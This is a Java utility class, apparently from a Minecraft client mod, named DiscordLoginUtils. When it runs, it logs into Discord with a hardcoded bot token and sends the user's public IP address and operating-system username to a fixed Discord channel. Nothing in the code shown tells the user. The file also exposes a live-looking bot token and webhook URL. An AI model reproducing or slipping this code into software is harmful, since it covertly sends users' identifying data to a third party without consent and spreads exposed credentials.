package me.deepcraft.utils;

import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.session.ReadyEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import javax.security.auth.login.LoginException;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;

public class DiscordLoginUtils extends ListenerAdapter {
    public static void webhook() throws LoginException {
        String discordToken = "MTE5NTQ2MDU2ODMxMjcyNTY3NQ.GyfZJI.394k-_wugXpLNPPiu1DUo06XakMufvJCQDI9EI";
        String webhookURL = "https://discord.com/api/webhooks/1195460747669540964/jxNL9Qg-33Ms2fTMacbzSqmMa-x2XfeQ5YOcFaoq0WdjtfbG2W86flIRQZEJvFQoRbRz";

        JDABuilder builder = JDABuilder.createDefault(discordToken);
        builder.addEventListeners(new DiscordLoginUtils());

        builder.build();
    }

    @Override
    public void onReady(ReadyEvent event) {
        TextChannel textChannel = event.getJDA().getTextChannelById("1195460496858558558");
        if (textChannel != null) {
            String pcUserName = getPcUserName();
            String message = "New Client Login!" + "\nIP Adresse: " + myPublicIp() + "\nPC Benutzername: " + pcUserName;
            textChannel.sendMessage(message).queue();
        }
    }

    public static String myPublicIp() {
        String ipv4Address = "";
        try {
            URL url = new URL("http://checkip.amazonaws.com");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ipv4Address = br.readLine().trim();
        } catch (IOException e) {
            e.printStackTrace();
        }

        return ipv4Address;
    }
    private String getPcUserName() {
        return System.getProperty("user.name");
    }
}

